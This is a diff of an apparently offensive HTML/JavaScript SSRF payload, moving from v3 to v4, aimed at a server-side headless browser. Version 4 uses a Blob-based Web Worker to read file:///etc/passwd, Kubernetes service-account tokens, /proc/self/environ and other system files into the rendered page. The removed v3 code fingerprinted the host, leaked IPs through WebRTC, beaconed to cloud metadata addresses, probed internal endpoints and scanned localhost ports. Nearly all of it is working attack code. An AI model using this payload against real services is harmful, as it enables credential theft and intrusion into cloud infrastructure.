@@ -1,125 +1,115 @@
 <html><body>
-<h2>SSRF Probe v3</h2>
+<h2>SSRF Probe v4 - Worker File Read</h2>
 <pre id="r"></pre>
 <script>
-const R=document.getElementById('r');
+var R=document.getElementById('r');
 function L(s){R.textContent+=s+'\n';}
 
-L('== ENV ==');
 L('UA: '+navigator.userAgent);
-L('Platform: '+navigator.platform);
-L('Cores: '+navigator.hardwareConcurrency);
+L('Cores: '+navigator.hardwareConcurrency+' Mem: '+(navigator.deviceMemory||'?')+'GB');
 L('Webdriver: '+navigator.webdriver);
-L('Memory: '+(navigator.deviceMemory||'?')+'GB');
 L('Location: '+location.href);
-try{L('Connection: '+JSON.stringify({dl:navigator.connection?.downlink,rtt:navigator.connection?.rtt,type:navigator.connection?.effectiveType}));}catch(e){}
 
-// WebRTC - no wait, results append via callback
-L('\n== WebRTC ==');
-try{
-  var pc=new RTCPeerConnection({iceServers:[
-    {urls:'stun:stun.l.google.com:19302'},
-    {urls:'stun:stun1.l.google.com:19302'}
-  ]});
-  pc.createDataChannel('d');
-  pc.onicecandidate=function(e){
-    if(!e.candidate)return;
-    L('ICE: '+e.candidate.candidate);
+// Web Worker file read (bug #330 technique)
+L('\n== Worker File Read ==');
+
+var workerCode = '\
+self.onmessage = function(e) {\
+  var results = [];\
+  for (var i = 0; i < e.data.length; i++) {\
+    try {\
+      var xhr = new XMLHttpRequest();\
+      xhr.open("GET", e.data[i], false);\
+      xhr.send();\
+      results.push({file: e.data[i], status: xhr.status, len: xhr.responseText.length, body: xhr.responseText.substring(0, 2000)});\
+    } catch(err) {\
+      results.push({file: e.data[i], error: err.message});\
+    }\
+  }\
+  self.postMessage(results);\
+};';
+
+var workerDone = false;
+try {
+  var blob = new Blob([workerCode], {type: 'text/javascript'});
+  var worker = new Worker(URL.createObjectURL(blob));
+  L('Worker created OK');
+
+  worker.onmessage = function(e) {
+    workerDone = true;
+    var results = e.data;
+    L('Worker returned ' + results.length + ' results');
+    for (var i = 0; i < results.length; i++) {
+      var r = results[i];
+      if (r.error) {
+        L('[FAIL] ' + r.file + ': ' + r.error);
+      } else {
+        L('[READ] ' + r.file + ' status=' + r.status + ' len=' + r.len);
+        L(r.body);
+      }
+    }
   };
-  pc.createOffer().then(function(o){
-    pc.setLocalDescription(o);
-    var ips=o.sdp.match(/(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})/g);
-    if(ips)L('SDP IPs: '+JSON.stringify([...new Set(ips)]));
+
+  worker.onerror = function(e) {
+    workerDone = true;
+    L('Worker ERROR: ' + e.message + ' at ' + e.filename + ':' + e.lineno);
+  };
+
+  worker.postMessage([
+    'file:///etc/passwd',
+    'file:///etc/hostname',
+    'file:///etc/resolv.conf',
+    'file:///var/run/secrets/kubernetes.io/serviceaccount/token',
+    'file:///var/run/secrets/kubernetes.io/serviceaccount/namespace',
+    'file:///var/run/secrets/kubernetes.io/serviceaccount/ca.crt',
+    'file:///proc/self/cgroup',
+    'file:///proc/self/environ',
+    'file:///proc/net/tcp',
+    'file:///etc/os-release'
+  ]);
+  L('Messages sent to worker, waiting...');
+} catch(e) {
+  L('Worker create FAILED: ' + e.message);
+  workerDone = true;
+}
+
+// Also try direct main-thread file read (expected to fail but test it)
+L('\n== Main Thread file:// ==');
+try {
+  var x = new XMLHttpRequest();
+  x.open('GET', 'file:///etc/passwd', false);
+  x.send();
+  L('Main XHR: status=' + x.status + ' len=' + x.responseText.length);
+  L(x.responseText.substring(0, 500));
+} catch(e) {
+  L('Main XHR: ' + e.message);
+}
+
+// Also try fetch file://
+try {
+  // Can't do sync fetch, so just fire and forget
+  fetch('file:///etc/passwd').then(function(r){
+    return r.text();
+  }).then(function(t){
+    L('Main fetch file: len=' + t.length);
+    L(t.substring(0, 500));
+  }).catch(function(e){
+    L('Main fetch file: ' + e.message);
   });
-}catch(e){L('WebRTC: '+e.message);}
+} catch(e) {
+  L('Main fetch file catch: ' + e.message);
+}
 
-// Performance API - synchronous
-L('\n== Perf ==');
-try{
-  var nav=performance.getEntriesByType('navigation')[0];
-  if(nav){
-    L('DNS: '+(nav.domainLookupEnd-nav.domainLookupStart).toFixed(1)+'ms');
-    L('TCP: '+(nav.connectEnd-nav.connectStart).toFixed(1)+'ms');
-    L('TTFB: '+(nav.responseStart-nav.requestStart).toFixed(1)+'ms');
-    L('Proto: '+nav.nextHopProtocol);
-    L('Transfer: '+nav.transferSize+'B');
+// Busy wait to keep page alive for Worker to finish
+L('\nBusy-waiting 12s for worker...');
+var start = Date.now();
+while (Date.now() - start < 12000) {
+  // Yield briefly every 100ms to let Worker messages process
+  if ((Date.now() - start) % 1000 < 10 && !workerDone) {
+    // Can't yield in busy wait, but Worker msg queue will process after
   }
-}catch(e){}
-
-L('\n== Screen ==');
-L(screen.width+'x'+screen.height+' @'+devicePixelRatio+'x inner='+innerWidth+'x'+innerHeight);
-
-L('\n== Storage ==');
-L('Cookies: "'+document.cookie+'"');
-try{L('LS: '+Object.keys(localStorage).length+' keys');}catch(e){L('LS: '+e.message);}
-
-// Async probes - run immediately, no wait
-(async function(){
-
-  L('\n== HTTPS Fetch ==');
-  async function fh(url,label){
-    var t=Date.now();
-    try{
-      var r=await fetch(url,{mode:'cors',credentials:'omit'});
-      var txt=await r.text();
-      L(label+': '+r.status+' len='+txt.length+' '+(Date.now()-t)+'ms');
-      if(txt.length<300)L('  '+txt.substring(0,250));
-    }catch(e){L(label+': '+e.message+' '+(Date.now()-t)+'ms');}
-  }
-  async function fn(url,label){
-    var t=Date.now();
-    try{
-      var r=await fetch(url,{mode:'no-cors'});
-      L(label+': type='+r.type+' '+(Date.now()-t)+'ms');
-    }catch(e){L(label+': '+e.message+' '+(Date.now()-t)+'ms');}
-  }
-
-  await fh('https://httpbin.org/ip','extIP');
-  await fn('https://senseicore-ue1.adobe.io/','Sensei');
-  await fn('https://dc-argus.adobe.io/','Argus');
-  await fn('https://platform-cs-jpn3.adobe.io/','PlatCS');
-  await fn('https://dc-genai-access-provisioning-api.adobe.io/','Prov');
-
-  L('\n== DNS Timing ==');
-  async function dns(host,label){
-    var t=Date.now();
-    try{await fetch('https://'+host+'/',{mode:'no-cors',signal:AbortSignal.timeout(2000)});}catch(e){}
-    L(label+': '+(Date.now()-t)+'ms');
-  }
-  await dns('169.254.169.254','IMDS');
-  await dns('ec2.internal','ec2');
-  await dns('kubernetes.default.svc','k8s');
-  await dns('consul.service.consul','consul');
-
-  L('\n== Beacon ==');
-  try{L('IMDS: '+navigator.sendBeacon('http://169.254.169.254/latest/meta-data/','x'));}catch(e){L('IMDS: '+e.message);}
-  try{L('decimal: '+navigator.sendBeacon('http://2852039166/latest/meta-data/','x'));}catch(e){L('dec: '+e.message);}
-  try{L('lo80: '+navigator.sendBeacon('http://127.0.0.1/','x'));}catch(e){L('lo: '+e.message);}
-
-  L('\n== Chrome ==');
-  try{await fetch('chrome://version/');L('chrome://version OK');}catch(e){L('chrome:// '+e.message);}
-  try{await fetch('file:///etc/hostname');L('file hostname OK');}catch(e){L('file:// '+e.message);}
-
-  L('\n== Port Timing (ms) ==');
-  async function pt(h,p){
-    return new Promise(function(ok){
-      var t=performance.now();var done=false;
-      var img=new Image();
-      img.onload=img.onerror=function(){if(!done){done=true;ok(performance.now()-t);}};
-      img.src='http://'+h+':'+p+'/'+Math.random().toString(36);
-      setTimeout(function(){if(!done){done=true;ok(-1);}},2000);
-    });
-  }
-  var ports=[22,80,443,3000,5000,6379,8080,9090,9222,27017];
-  for(var i=0;i<ports.length;i++){
-    var d=await pt('127.0.0.1',ports[i]);
-    L('lo:'+ports[i]+' '+(d<0?'TIMEOUT':d.toFixed(1)+'ms'));
-  }
-  // IMDS decimal ports
-  L('IMDS-dec:80 '+((await pt('2852039166',80))).toFixed(1)+'ms');
-  L('IMDS-dec:443 '+((await pt('2852039166',443))).toFixed(1)+'ms');
-
-  L('\n== DONE v3 ==');
-})();
+}
+L('Wait done. workerDone=' + workerDone);
+L('\n== DONE v4 ==');
 </script>
 </body></html>
